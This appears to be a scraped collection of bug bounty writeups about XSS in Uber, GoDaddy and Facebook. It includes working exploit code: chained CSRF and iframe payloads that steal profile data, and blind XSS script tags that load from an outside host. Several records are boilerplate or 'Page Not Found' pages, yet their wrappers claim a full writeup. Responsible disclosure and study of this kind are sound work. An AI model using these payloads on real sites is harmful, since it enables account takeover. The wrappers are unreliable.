*.uber.com subdomain ( original research here ): https://business.uber.com/new/confirm/test;,arbitrary=cookie;domain=.uber.com Combining these two minor vulnerabilities, we can attack any external user: first login victim into account with Self-XSS, and then trigger XSS against him. PoC exploit code : < script > function exploit ( ) { setTimeout( function ( ) { var s1 = new XMLHttpRequest(); // first request is necessary for exploitation s1.open( 'GET' , 'https://m.uber.com/' , false ); s1.send( null ); document .location.href= 'https://m.uber.com/' ; // now redirecting to page }, 3000 ); } </ script > < body onload = \"exploit()\" > < script > var xmlhttp = new XMLHttpRequest(); xmlhttp.open( 'GET' , 'https://business.uber.com/new/confirm/test;,token= XXXXXXXXXXXXXXX ;domain=.uber.com' , false ); // insert your token here xmlhttp.send( null ); </ script > Good news (it works!): My exploit was working since late March, and was also working at the time of my report to Uber (May 9): Bad news: I provided all evidence that Self-XSS was found by me some time before it was reported by another researcher. Unlikely, Self-XSS was silently patched several hours after I reported the issue through Hackerone, and I received ` We're having some trouble reproducing your proof of concept <...> Thanks again and good luck in your future bug hunting. ` message from triage team. After involving Hackerone team into discussion, I got rewarded for 1000$ for arbitrary cookie installation, instead of 5k+ (Stored XSS with ability to steal sensitive COOKIE data). Takeaway: Never stop trying to elevate found vulnerabilities, and please don't report non-security issues out-of-scope for having only +7 of reputation, when you have a feeling that the vulnerability is potentially exploitable under higher privileges. Otherwise you will be literally killing someone's bounty - and what is worse, you will never improve. Posted by httpsonly at 14:27 Email This BlogThis! Share to X Share to Facebook Share to Pinterest 2 comments: zxcvbn 30 August 2016 at 03:20 Nice! I think it's closer to reflected XSS than stored in terms of risk though as it involves visiting a malicious external page. Reply Delete Replies Reply Ron CHhh 17 February 2017 at 21:44 Ughhhhh, I wish I can find a cookies installation in any subdomain of uber, so that I can chain it to steal oauth token.... Reply Delete Replies Reply Add comment Load more... Newer Post Older Post Home Subscribe to: Post Comments (Atom) Archive ► 2018 (1) ► April (1) ► 2017 (1) ► January (1) ▼ 2016 (3) ▼ August (3) Turning Self-XSS into Good XSS v2: Challenge Compl... CVE-2015-8786 writeup: RabbitMQ CVE-2016-0782 writeup Simple theme. Powered by Blogger ."}
{"source_url": "https://guptashubham.com/stored-xss-in-unifi-v4-8-12-controller/", "title": "Shubham Gupta - Security Researcher & Ethical Hacker", "friendly_explanation": "This is a bug bounty writeup from https://guptashubham.com/stored-xss-in-unifi-v4-8-12-controller/. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nShubham Gupta - Security Researcher & Ethical Hacker Shubham Gupta Security Researcher & Bug Hunter What is Hacking? Hall of Fame Recognized by leading tech companies View All Security Researcher & Bug Hunter | | Ranked bug bounty hunter and security researcher with expertise in identifying critical vulnerabilities. Specializing in web application security, network penetration testing, and security research. 600+ Hall of Fame recognitions 1337+ Bugs reported successfully 50+ Security projects completed Penetration Testing Comprehensive security assessments for web/mobile applications and networks Bug Bounty Hunting Ranked bug bounty hunter with proven track record Security Research Deep dive into application security and vulnerability research CTF Player Active participant in web and mobile CTF challenges Tap on the pointers to learn more Achievements 0 Hall of Fame 0 Bugs Reported 0 Projects CPU Client Reviews Testimonials Put your security skills to the test in our interactive hacking playground Learn by Doing Hands-on experience with real-world security scenarios Build Portfolio Track progress and showcase your achievements to employers Community Support Connect with peers and get help from experienced hackers Realistic Scenarios Practice on environments that mirror real-world applications Earn Rewards Collect points, badges, and certificates as you complete challenges Level Up Skills Progressive difficulty to help you grow from beginner to expert Capture The Flag Challenges Test your skills. Learn new techniques. Earn rewards. esc F1 F2 F3 F4 F5 F6 F7 F8 F8 F10 F11 F12 ~ ` ! 1 @ 2 # 3 $ 4 % 5 ^ 6 & 7 * 8 ( 9 ) 0 â _ + = delete tab Q W E R T Y U I O P { [ } ] | \\ caps lock A S D F G H J K L : ; \" ' return shift Z X C V B N M < , > . ? / shift fn control option command command option Coming Soon Learn by Doing Hands-on experience with real-world security scenarios Build Portfolio Track progress and showcase your achievements to employers Realistic Scenarios Practice on environments that mirror real-world applications Earn Rewards Collect points, badges, and certificates as you complete challenges Level Up Skills Progressive difficulty to help you grow from beginner to expert Join the waitlist Learn more"}
{"source_url": "https://guptashubham.com/swf-xss-dom-based-xss/", "title": "Shubham Gupta - Security Researcher & Ethical Hacker", "friendly_explanation": "This is a bug bounty writeup from https://guptashubham.com/swf-xss-dom-based-xss/. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nShubham Gupta - Security Researcher & Ethical Hacker Shubham Gupta Security Researcher & Bug Hunter What is Hacking? Hall of Fame Recognized by leading tech companies View All Security Researcher & Bug Hunter | | Ranked bug bounty hunter and security researcher with expertise in identifying critical vulnerabilities. Specializing in web application security, network penetration testing, and security research. 600+ Hall of Fame recognitions 1337+ Bugs reported successfully 50+ Security projects completed Penetration Testing Comprehensive security assessments for web/mobile applications and networks Bug Bounty Hunting Ranked bug bounty hunter with proven track record Security Research Deep dive into application security and vulnerability research CTF Player Active participant in web and mobile CTF challenges Tap on the pointers to learn more Achievements 0 Hall of Fame 0 Bugs Reported 0 Projects CPU Client Reviews Testimonials Put your security skills to the test in our interactive hacking playground Learn by Doing Hands-on experience with real-world security scenarios Build Portfolio Track progress and showcase your achievements to employers Community Support Connect with peers and get help from experienced hackers Realistic Scenarios Practice on environments that mirror real-world applications Earn Rewards Collect points, badges, and certificates as you complete challenges Level Up Skills Progressive difficulty to help you grow from beginner to expert Capture The Flag Challenges Test your skills. Learn new techniques. Earn rewards. esc F1 F2 F3 F4 F5 F6 F7 F8 F8 F10 F11 F12 ~ ` ! 1 @ 2 # 3 $ 4 % 5 ^ 6 & 7 * 8 ( 9 ) 0 â _ + = delete tab Q W E R T Y U I O P { [ } ] | \\ caps lock A S D F G H J K L : ; \" ' return shift Z X C V B N M < , > . ? / shift fn control option command command option Coming Soon Learn by Doing Hands-on experience with real-world security scenarios Build Portfolio Track progress and showcase your achievements to employers Realistic Scenarios Practice on environments that mirror real-world applications Earn Rewards Collect points, badges, and certificates as you complete challenges Level Up Skills Progressive difficulty to help you grow from beginner to expert Join the waitlist Learn more"}
{"source_url": "https://guptashubham.com/svg-xss-in-unifi-v5-0-2/", "title": "Shubham Gupta - Security Researcher & Ethical Hacker", "friendly_explanation": "This is a bug bounty writeup from https://guptashubham.com/svg-xss-in-unifi-v5-0-2/. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nShubham Gupta - Security Researcher & Ethical Hacker Shubham Gupta Security Researcher & Bug Hunter What is Hacking? Hall of Fame Recognized by leading tech companies View All Security Researcher & Bug Hunter | | Ranked bug bounty hunter and security researcher with expertise in identifying critical vulnerabilities. Specializing in web application security, network penetration testing, and security research. 600+ Hall of Fame recognitions 1337+ Bugs reported successfully 50+ Security projects completed Penetration Testing Comprehensive security assessments for web/mobile applications and networks Bug Bounty Hunting Ranked bug bounty hunter with proven track record Security Research Deep dive into application security and vulnerability research CTF Player Active participant in web and mobile CTF challenges Tap on the pointers to learn more Achievements 0 Hall of Fame 0 Bugs Reported 0 Projects CPU Client Reviews Testimonials Put your security skills to the test in our interactive hacking playground Learn by Doing Hands-on experience with real-world security scenarios Build Portfolio Track progress and showcase your achievements to employers Community Support Connect with peers and get help from experienced hackers Realistic Scenarios Practice on environments that mirror real-world applications Earn Rewards Collect points, badges, and certificates as you complete challenges Level Up Skills Progressive difficulty to help you grow from beginner to expert Capture The Flag Challenges Test your skills. Learn new techniques. Earn rewards. esc F1 F2 F3 F4 F5 F6 F7 F8 F8 F10 F11 F12 ~ ` ! 1 @ 2 # 3 $ 4 % 5 ^ 6 & 7 * 8 ( 9 ) 0 â _ + = delete tab Q W E R T Y U I O P { [ } ] | \\ caps lock A S D F G H J K L : ; \" ' return shift Z X C V B N M < , > . ? / shift fn control option command command option Coming Soon Learn by Doing Hands-on experience with real-world security scenarios Build Portfolio Track progress and showcase your achievements to employers Realistic Scenarios Practice on environments that mirror real-world applications Earn Rewards Collect points, badges, and certificates as you complete challenges Level Up Skills Progressive difficulty to help you grow from beginner to expert Join the waitlist Learn more"}
{"source_url": "https://guptashubham.com/xss-filter-bypass-in-yahoo-dev-flurry-com/", "title": "Shubham Gupta - Security Researcher & Ethical Hacker", "friendly_explanation": "This is a bug bounty writeup from https://guptashubham.com/xss-filter-bypass-in-yahoo-dev-flurry-com/. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nShubham Gupta - Security Researcher & Ethical Hacker Shubham Gupta Security Researcher & Bug Hunter What is Hacking? Hall of Fame Recognized by leading tech companies View All Security Researcher & Bug Hunter | | Ranked bug bounty hunter and security researcher with expertise in identifying critical vulnerabilities. Specializing in web application security, network penetration testing, and security research. 600+ Hall of Fame recognitions 1337+ Bugs reported successfully 50+ Security projects completed Penetration Testing Comprehensive security assessments for web/mobile applications and networks Bug Bounty Hunting Ranked bug bounty hunter with proven track record Security Research Deep dive into application security and vulnerability research CTF Player Active participant in web and mobile CTF challenges Tap on the pointers to learn more Achievements 0 Hall of Fame 0 Bugs Reported 0 Projects CPU Client Reviews Testimonials Put your security skills to the test in our interactive hacking playground Learn by Doing Hands-on experience with real-world security scenarios Build Portfolio Track progress and showcase your achievements to employers Community Support Connect with peers and get help from experienced hackers Realistic Scenarios Practice on environments that mirror real-world applications Earn Rewards Collect points, badges, and certificates as you complete challenges Level Up Skills Progressive difficulty to help you grow from beginner to expert Capture The Flag Challenges Test your skills. Learn new techniques. Earn rewards. esc F1 F2 F3 F4 F5 F6 F7 F8 F8 F10 F11 F12 ~ ` ! 1 @ 2 # 3 $ 4 % 5 ^ 6 & 7 * 8 ( 9 ) 0 â _ + = delete tab Q W E R T Y U I O P { [ } ] | \\ caps lock A S D F G H J K L : ; \" ' return shift Z X C V B N M < , > . ? / shift fn control option command command option Coming Soon Learn by Doing Hands-on experience with real-world security scenarios Build Portfolio Track progress and showcase your achievements to employers Realistic Scenarios Practice on environments that mirror real-world applications Earn Rewards Collect points, badges, and certificates as you complete challenges Level Up Skills Progressive difficulty to help you grow from beginner to expert Join the waitlist Learn more"}
{"source_url": "https://guptashubham.com/xss-on-flickr/", "title": "Shubham Gupta - Security Researcher & Ethical Hacker", "friendly_explanation": "This is a bug bounty writeup from https://guptashubham.com/xss-on-flickr/. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nShubham Gupta - Security Researcher & Ethical Hacker Shubham Gupta Security Researcher & Bug Hunter What is Hacking? Hall of Fame Recognized by leading tech companies View All Security Researcher & Bug Hunter | | Ranked bug bounty hunter and security researcher with expertise in identifying critical vulnerabilities. Specializing in web application security, network penetration testing, and security research. 600+ Hall of Fame recognitions 1337+ Bugs reported successfully 50+ Security projects completed Penetration Testing Comprehensive security assessments for web/mobile applications and networks Bug Bounty Hunting Ranked bug bounty hunter with proven track record Security Research Deep dive into application security and vulnerability research CTF Player Active participant in web and mobile CTF challenges Tap on the pointers to learn more Achievements 0 Hall of Fame 0 Bugs Reported 0 Projects CPU Client Reviews Testimonials Put your security skills to the test in our interactive hacking playground Learn by Doing Hands-on experience with real-world security scenarios Build Portfolio Track progress and showcase your achievements to employers Community Support Connect with peers and get help from experienced hackers Realistic Scenarios Practice on environments that mirror real-world applications Earn Rewards Collect points, badges, and certificates as you complete challenges Level Up Skills Progressive difficulty to help you grow from beginner to expert Capture The Flag Challenges Test your skills. Learn new techniques. Earn rewards. esc F1 F2 F3 F4 F5 F6 F7 F8 F8 F10 F11 F12 ~ ` ! 1 @ 2 # 3 $ 4 % 5 ^ 6 & 7 * 8 ( 9 ) 0 â _ + = delete tab Q W E R T Y U I O P { [ } ] | \\ caps lock A S D F G H J K L : ; \" ' return shift Z X C V B N M < , > . ? / shift fn control option command command option Coming Soon Learn by Doing Hands-on experience with real-world security scenarios Build Portfolio Track progress and showcase your achievements to employers Realistic Scenarios Practice on environments that mirror real-world applications Earn Rewards Collect points, badges, and certificates as you complete challenges Level Up Skills Progressive difficulty to help you grow from beginner to expert Join the waitlist Learn more"}
{"source_url": "https://thehackerblog.com/poisoning-the-well-compromising-godaddy-customer-support-with-blind-xss/index.html", "title": "Poisoning the Well – Compromising GoDaddy Customer Support With Blind XSS – The Hacker Blog", "friendly_explanation": "This is a bug bounty writeup from https://thehackerblog.com/poisoning-the-well-compromising-godaddy-customer-support-with-blind-xss/index.html. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nPoisoning the Well – Compromising GoDaddy Customer Support With Blind XSS – The Hacker Blog The Hacker Blog FlashHTTPRequest JudasDNS XSS Hunter tarnish Home Poisoning the Well – Compromising GoDaddy Customer Support With Blind XSS May 08, 2016 Reading time ~7 minutes Home tarnish XSS Hunter JudasDNS FlashHTTPRequest | Follow @IAmMandatory Poisoning the Well – Compromising GoDaddy Customer Support With Blind XSS This is the first part of a series of stories of compromising companies via blind cross-site scripting. As companies fix the issues and allow me to disclose them, I will post them here. Blind cross-site scripting (XSS) is an often-missed class of XSS which occurs when an XSS payload fires in a browser other than the attackerâs/pentesterâs. This flavour of XSS is often missed by penetration testers due to the standard alert box approach being a limited methodology for finding these vulnerabilities . When your payloads are all <script>alert(1)</script> youâre making the assumption that the XSS will fire in your browser, when itâs likely it will fire in other places and in other browsers. Without a payload that notifies you regardless of the browser it fires in, youâre probably missing out on the biggest vulnerabilities. Poisoning the Well One of the interesting things about using a blind XSS tool (in my case Iâm using XSS Hunter ) is that you can sprinkle your payloads across a service and wait until someone else triggers them. The more you test for blind XSS the more you realize the game is about âpoisoningâ the data stores that applications read from. For example, a users database is likely read by more than just the main web application. There is likely log viewing apps, administrative panels, and data analytics services which all draw from the same end storage. All of these services are just as likely to be vulnerable to XSS if not more because they are often not as polished as the final web service that the end customer uses. To make a physical comparison, blind XSS payloads act more like mines which lie dormant until someone triggers them. Yes, my name is <script src=//y.vg></script>. GoDaddy is a perfect example of the above. While using GoDaddy I noticed that my first and last name could be set to an XSS payload. I opted to use my generic for both fields: Humorously, I had completely forgotten that I had done so until I later had a problem with one of my domains. Later on I called GoDaddyâs customer support to try to get a domain transferred to a different registrar. The agent appeared to be having trouble looking up my account due to their systems âexperiencing issuesâ. It was then my phone vibrated twice indicating I had just gotten two emails in rapid succession. As it turns out, those emails were notifications that my previously planted XSS payloads had fired: It appears that GoDaddyâs internal customer support panel was indeed vulnerable to XSS! I made an excuse about having to deal with a personal matter and ended the support call. After investigating the report generated by XSS Hunter, the DOM capture gave away why the support rep was having troubles: <script type=\"text/javascript\"> var CRM = CRM || {}; CRM.Shopper = CRM.Shoper || { }; CRM.Shopper.JSON = {\"shopperId\":\"34729611\",\"privateLabelId\":1,\"accountInfo\":{\"accountUsageTypeId\":0,\"emailTypeID\":2},\"personalInfo\":{\"firstName\":\"\\\"><script src=https://y.vg></script><script src=\"https://img4.wsimg.com/starfield/sf.core/v1.8.5/sf.core.js\" async=\"\" charset=\"utf-8\"></script></head><body>\",\"lastName\":\"\\\"><script src=\"https://y.vg\"></script><iframe scrolling=\"no\" style=\"visibility: hidden; position: absolute; top: -10000px; left: -10000px;\" height=\"889\" width=\"1264\"></iframe>\",\"company\":\"\\\"><script src=\"https://y.vg\"></script></body> As can be seen in the above DOM capture, my XSS payload borked the JSON displayed in the webpage body and escaped the Impact Using this vulnerability I could perform any action as the GoDaddy customer rep. This is a bad deal because GoDaddy representatives have the ability to do basically anything with your account. On other support calls with GoDaddy my agent was able to do everything from modifying account information, to transferring domain names, to deleting my account altogether. In a real attack scenario, the next step for exploitation would be to inject a proper BeEF hook into the agentâs browser to ride their session (using XSS Hunterâs JavaScript chainload functionality) and use the support website as them. However, since Iâm not malicious I opted to report the issue to them shortly after finding it (see below Disclosure Timeline). Blind XSS Remediation â Keeping the Well Clean This story brings up an interesting point about XSS remediation. While the standard remediation for XSS is generally contextually-aware output encoding , you can actually get huge security gains from preventing the payloads from being stored at all. When you do proper output encoding, you have to do it on every system which pulls data from your data store. However, if you simply ensure that the stored data is clean you can prevent exploitation of many systems because the payload would never be able to be stored in the first place. Obviously, ideally you would have both, but for companies with many services drawing from the same data sources you can get a lot of win with just a little filtering. This is the approach that GoDaddy took for remediation, likely for the same reasons. Disclosure Timeline *I apologize if some of these dates are a day or two offÂ as Cobalt (the bug bounty service GoDaddy uses) has awful timestamps which round up to the nearest month if you go far enough back. For this reason I donât have exact timestamps for all of this, but I try to be as close as possible. 12/28/15 â Emailed [email protected] about reporting the security vulnerability. 12/29/15 â After some research, emailed [email protected] instead about reporting the issue. 12/30/15 â Invited to GoDaddyâs private bug bounty program. 12/30/15 â Reported vulnerability via Cobaltâs bug bounty web service. 02/06/16 â GoDaddy closed issue as a duplicate stating the following: âThis is actually a known issue and we are working to resolve it. Also keep in mind that our bug bounty only covers www.godaddy.com and sso.godaddy.com. crm.int.godaddy.com would be considered out of scope. But since this has already been reported since you need to create a username/password at sso.godaddy.com, I am not counting it as out of scope; just a duplicate.â 02/06/16 â Requested public disclosure after three months pass, due to high severity of issue (and the fact that it was known to them before I reported it, making it unclear how long the issue has existed). 02/06/16 â GoDaddy responds with the following: âWe appreciate you letting us know of the severity of this issue. We are definitely working on this, and when we fix the issue, we will let you know the status of this. You may want to follow up in a few weeks with us. Since you have now heard from us, we respectfully ask that you do not disclose this until we have fixed it. Please keep in mind that you agreed to the Cobalt/GoDaddy terms of agreement when you signed up for our Bug Bounty. The agreement states: âYou may disclose vulnerabilities only after proper remediation has occurred and may not disclose any confidential information without prior written consent.â The full agreement can be found at: https://cobalt.io/godaddy-betaâ 02/07/16 â Agree to not disclose until the issue is fixed. 02/07/16 â 04/07/16 â Multiple pings to the GoDaddy bug bounty team asking on the status of the issue. 04/11/16 â After waiting ~3 months I respond with the following: âHey @[REDACTED] checking in on an update. Iâm a little disappointed in the response time on this because of how critical this vulnerability is. Iâm moving my domains off of GoDaddy this week (since they could all be stolen/accessed using this issue) but for other GoDaddy users this is still outstanding critical issue that affects them. Iâve waited over three months so far for a fix so I feel giving this one more month until public disclosure takes place is fair (this is more time than Googleâs Project Zero gives: http://googleprojectzero.blogspot.com/2015/02/feedback-and-data-driven-updates-to.html). To clarify, the reason behind disclosure is not to extort (I donât care about reward) but only to make other GoDaddy users aware of the outstanding issue (and also to incentivize a fix). I am aware this violates the Terms of Service of Cobalt.io am not super concerned about being banned as this is the only bug bounty Iâve participated in which is hosted here. Let me know your thoughts on this timeline. Thanks.â 04/13/16 â Pinged GoDaddy to ensure they got the above message. 04/13/16 â GoDaddy responds with: âHi Mandatory, we have received your reply and I am escalating this issue internally. As soon as I hear from the development team, I will reply with details and hopefully a timeline for remediation.â 04/20/16 â Checked in on fix status. 04/20/16 â GoDaddy responds with: âThis issue has involved several teams from the front and backend. They have pushed out some minor changes but are still working on fixing the entire issue from front to back. Feel free to follow up in a few days or some time next week. Hopefully weâll have fixed the issue completely.â 04/25/16 â GoDaddy responds with: âJust wanted to update you that our developers have deployed code changes which should now prevent XSS from happening on account usernames and account profile information such as your first and last name. Feel free to test and let us know if you are still able to replicate the issue.â 04/27/16 â Confirmed that you can no longer set your profile information to an XSS payload. Fixing the root cause. blind xss godaddy blind xss godaddy customer support hacked godaddy hacked godaddy xss well poisoning xss xss hunter xsshunter Matthew Bryant (mandatory) Like Tweet +1 About the Author Matthew Bryant (mandatory) Security researcher who needs to sleep more. Opinions expressed are solely my own and do not express the views or opinions of my employer. Follow @mandatoryprogrammer Follow @IAmMandatory Read More \"Zero-Days\" Without Incident - Compromising Angular via Expired npm Publisher Email Domains **NOTE:** *If you're just looking for the high level points, see the\"[The TL;DR Summary & High-LevelPoints](#the-tldr-summary--high-level...… Continue reading Video Downloader and Video Downloader Plus Chrome Extension Hijack Exploit - UXSS via CSP Bypass (~15.5 Million Affected) Published on February 22, 2019 Kicking the Rims – A Guide for Securely Writing and Auditing Chrome Extensions Published on June 12, 2018 © 2022 Matthew Bryant (mandatory). Powered by Jekyll using the Neo-HPSTR Theme ."}
{"source_url": "https://whitton.io/articles/uber-turning-self-xss-into-good-xss/", "title": "Uber Bug Bounty: Turning Self-XSS into Good-XSS – Jack", "friendly_explanation": "This is a bug bounty writeup from https://whitton.io/articles/uber-turning-self-xss-into-good-xss/. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nUber Bug Bounty: Turning Self-XSS into Good-XSS – Jack Open Menu Home About Jack I participate in bug bounty programmes Learn More Email Twitter GitHub Posts All Posts All Tags Image source: _robson_ Uber Bug Bounty: Turning Self-XSS into Good-XSS March 22, 2016 Reading time ~6 minutes Now that the Uber bug bounty programme has launched publicly, I can publish some of my favourite submissions, which I’ve been itching to do over the past year. This is part one of maybe two or three posts. On Uber’s Partners portal , where Drivers can login and update their details, I found a very simple, classic XSS: changing the value of one of the profile fields to <script>alert(document.domain);</script> causes the code to be executed, and an alert box popped. This took all of two minutes to find after signing up, but now comes the fun bit. Self-XSS Being able to execute additional, arbitrary JavaScript under the context of another site is called Cross-Site Scripting (which I’m assuming 99% of my readers know). Normally you would want to do this against other users in order to yank session cookies, submit XHR requests, and so on. If you can’t do this against another user - for example, the code only executes against your account, then this is known as a self-XSS. In this case, it would seem that’s what we’ve found. The address section of your profile is only shown to you (the exception may be if an internal Uber tool also displays the address, but that’s another matter), and we can’t update another user’s address to force it to be executed against them. I’m always hesitant to send in bugs which have potential (an XSS in this site would be cool), so let’s try and find a way of removing the “self” part from the bug. Uber OAuth Login Flow The OAuth that flow Uber uses is pretty typical: User visits an Uber site which requires login, e.g. partners.uber.com User is redirected to the authorisation server, login.uber.com User enters their credentials User is redirected back to partners.uber.com with a code, which can then be exchanged for an access token In case you haven’t spotted from the above screenshot, the OAuth callback, /oauth/callback?code=... , doesn’t use the recommended state parameter. This introduces a CSRF vulnerability in the login function, which may or may-not be considered an important issue. In addition, there is a CSRF vulnerability in the logout function, which really isn’t considered an issue. Browsing to /logout destroys the user’s partner.uber.com session, and performs a redirect to the same logout function on login.uber.com . Since our payload is only available inside our account, we want to log the user into our account, which in turn will execute the payload. However, logging them into our account destroys their session, which destroys a lot of the value of the bug (it’s no longer possible to perform actions on their account). So let’s chain these three minor issues (self-XSS and two CSRF’s) together. For more info on OAuth security, check out @homakov’s awesome guide . Chaining Minor Bugs Our plan has three parts to it: First, log the user out of their partner.uber.com session, but not their login.uber.com session. This ensures that we can log them back into their account Second, log the user into our account, so that our payload will be executed Finally, log them back into their account, whilst our code is still running, so that we can access their details Step 1. Logging Out of Only One Domain We first want to issue a request to https://partners.uber.com/logout/ , so that we can then log them into our account. The problem is that issuing a requets to this end-point results in a 302 redirect to https://login.uber.com/logout/ , which destroys the session. We can’t intercept each redirect and drop the request, since the browser follows these implicitly. However, one trick we can do is to use Content Security Policy to define which sources are allowed to be loaded (I hope you can see the irony in using a feature designed to help mitigate XSS in this context). We’ll set our policy to only allow requests to partners.uber.com , which will block https://login.uber.com/logout/ . <!-- Set content security policy to block requests to login.uber.com, so the target maintains their session --> <meta http-equiv= \"Content-Security-Policy\" content= \"img-src https://partners.uber.com\" > <!-- Logout of partners.uber.com --> <img src= \"https://partners.uber.com/logout/\" > This works, as indicated by the CSP violation error message: Step 2. Logging Into Our Account This one is relatively simple. We issue a request to https://partners.uber.com/login/ to initiate a login (this is needed else the application won’t accept the callback). Using the CSP trick we prevent the flow being completed, then we feed in our own code (which can be obtained by logging into our own account), which logs them in to our account. Since a CSP violation triggers the onerror event handler, this will be used to jump to the next step. <!-- Set content security policy to block requests to login.uber.com, so the target maintains their session --> <meta http-equiv= \"Content-Security-Policy\" content= \"img-src partners.uber.com\" > <!-- Logout of partners.uber.com --> <img src= \"https://partners.uber.com/logout/\" onerror= \"login();\" > <script> //Initiate login so that we can redirect them var login = function () { var loginImg = document . createElement ( ' img ' ); loginImg . src = ' https://partners.uber.com/login/ ' ; loginImg . onerror = redir ; } //Redirect them to login with our code var redir = function () { //Get the code from the URL to make it easy for testing var code = window . location . hash . slice ( 1 ); var loginImg2 = document . createElement ( ' img ' ); loginImg2 . src = ' https://partners.uber.com/oauth/callback?code= ' + code ; loginImg2 . onerror = function () { //Redirect to the profile page with the payload window . location = ' https://partners.uber.com/profile/ ' ; } } </script> Step 3. Switching Back to Their Account This part is the code that will be contained as the XSS payload, stored in our account. As soon as this payload is executed, we can switch back to their account. This must be in an iframe - we need to be able to continue running our code. //Create the iframe to log the user out of our account and back into theirs var loginIframe = document . createElement ( ' iframe ' ); loginIframe . setAttribute ( ' src ' , ' https://fin1te.net/poc/uber/login-target.html ' ); document . body . appendChild ( loginIframe ); The contents of the iframe uses the CSP trick again: <!-- Set content security policy to block requests to login.uber.com, so the target maintains their session --> <meta http-equiv= \"Content-Security-Policy\" content= \"img-src partners.uber.com\" > <!-- Log the user out of our partner account --> <img src= \"https://partners.uber.com/logout/\" onerror= \"redir();\" > <script> //Log them into partners via their session on login.uber.com var redir = function () { window . location = ' https://partners.uber.com/login/ ' ; }; </script> The final piece is to create another iframe, so we can grab some of their data. //Wait a few seconds, then load the profile page, which is now *their* profile setTimeout ( function () { var profileIframe = document . createElement ( ' iframe ' ); profileIframe . setAttribute ( ' src ' , ' https://partners.uber.com/profile/ ' ); profileIframe . setAttribute ( ' id ' , ' pi ' ); document . body . appendChild ( profileIframe ); //Extract their email as PoC profileIframe . onload = function () { var d = document . getElementById ( ' pi ' ). contentWindow . document . body . innerHTML ; var matches = /value=\" ([^ \" ] + ) \" name=\"email\"/ . exec ( d ); alert ( matches [ 1 ]); } }, 9000 ); Since our final iframe is loaded from the same origin as the Profile page containing our JS, and X-Frame-Options is set to sameorigin not deny , we can access the content inside of it (using contentWindow ) Putting It All Together After combining all the steps, we have the following attack flow: Add the payload from step 3 to our profile Login to our account, but cancel the callback and make note of the unused code parameter Get the user to visit the file we created from step 2 - this is similar to how you would execute a reflected-XSS against someone The user will then be logged out, and logged into our account The payload from step 3 will be executed In a hidden iframe, they’ll be logged out of our account In another hidden iframe, they’ll be logged into their account We now have an iframe, in the same origin containing the user’s session This was a fun bug, and proves that it’s worth persevering to show a bug can have a higher impact than originally thought. websec bugbounty xss selfxss uber Updated on March 22, 2016 Jack Like Tweet +1 Read More From Bug Bounty Hunter, to Engineer, and Beyond A couple weeks ago I had my last day on Facebook's Product Security team. Abittersweet moment, but one which marks a \"new chapter\" in my ...… Continue reading Obtaining Login Tokens for an Outlook, Office or Azure Account Published on April 03, 2016 An XSS on Facebook via PNGs & Wonky Content Types Published on January 27, 2016 © 2020 Jack. Powered by Jekyll using the HPSTR Theme ."}
{"source_url": "http://www.paulosyibelo.com/2017/07/coinbase-angularjs-dom-xss-via-kiteworks.html", "title": "Page Not Found - Paulos Yibelo - Hacking Research", "friendly_explanation": "This is a bug bounty writeup from http://www.paulosyibelo.com/2017/07/coinbase-angularjs-dom-xss-via-kiteworks.html. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nPage Not Found - Paulos Yibelo - Hacking Research Paulos Yibelo | Official Blog. Powered by Blogger . About Paulos I write about application security and client side offensive exploit research. I really enjoy breaking things and occasionally do bug bounties, with notable references such as Coinbase , Facebook , Twitter ... Popular Posts This man thought opening a TXT file is fine, he thought wrong. macOS CVE-2019-8761 Pre-auth RCE via XXE & SSRF on NetGear Stora, SeaGate Home, and Medion LifeCloud NAS DoubleClickjacking: A New Era of UI Redressing Exploiting PHP Upload forms with CVE-2015-2348 Cross Window Forgery: A New Class of Web Attack ZTE ZXDSL 831 Router Exploits: Hacking and Rooting my internet neighbor Why CSP Should be carefully crafted: Twitter XSS & CSP Bypass Tweets by PaulosYibelo Blog Archive ▼ 2014 (9) ▼ July (3) It Begins. Facebook Bug Bounty 2014: Linkshim Evasion and URL... Facebook Bug Bounty 2014, Reflected XSS and Filter... ► September (2) ► November (2) ► December (2) ► 2015 (4) ► January (1) ► March (2) ► May (1) ► 2016 (3) ► June (1) ► October (1) ► November (1) ► 2017 (2) ► May (2) ► 2018 (4) ► February (1) ► April (1) ► June (1) ► November (1) ► 2021 (1) ► April (1) ► 2024 (2) ► February (1) ► December (1) Labels about (1) bugbounty (6) bypass (4) cve (3) findings (7) personal (1) php (4) websecurity (12) Blog Templates Created By BeautyTemplates . Back to top"}
{"source_url": "https://whitton.io/articles/xss-on-facebook-via-png-content-types/", "title": "An XSS on Facebook via PNGs & Wonky Content Types – Jack", "friendly_explanation": "This is a bug bounty writeup from https://whitton.io/articles/xss-on-facebook-via-png-content-types/. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nAn XSS on Facebook via PNGs & Wonky Content Types – Jack Open Menu Home About Jack I participate in bug bounty programmes Learn More Email Twitter GitHub Posts All Posts All Tags Image source: _robson_ An XSS on Facebook via PNGs & Wonky Content Types January 27, 2016 Reading time ~6 minutes Content uploaded to Facebook is stored on their CDN , which is served via various domains (most of which are sub-domains of either akamaihd.net or fbcdn.net ). The captioning feature of Videos also stores the .srt files on the CDN, and I noticed that right-angle brackets were un-encoded. https://fbcdn-dragon-a.akamaihd.net/hphotos-ak-xaf1/….srt I was trying to think of ways to get the file interpreted as HTML. Maybe MIME sniffing (since there’s no X-Content-Type-Option header)? It’s actually a bit easier than that. We can just change the extension to .html (which probably shouldn’t be possible…). https://fbcdn-dragon-a.akamaihd.net/hphotos-ak-xaf1/t39.2093-6/….html Unfortunately left angles are stripped out (which I later found out was due to @phwd ’s very much related finding ), so there’s not much we can do here. Instead, I looked for other files which could also be loaded as text/html . A lot of the photos/videos on Facebook now seem to contain a hash in the URL (parameters oh and __gda__ ), which causes an error to be thrown if we modify the file extension. Luckily, advert images don’t contain these parameters. All that we have to do now is find a way to embed some HTML into an image. The trouble is that Exif data is stripped out of JPEGs, and iTXt chunks are stripped out of PNGs. If we try to blindly insert a string into an image and upload it we receive an error. PNG IDAT Chunks I started searching for ideas and came across this great blog post: “Encoding Web Shells in PNG IDAT chunks” . This section of this bug is made possible due that post, so props to the author. The post 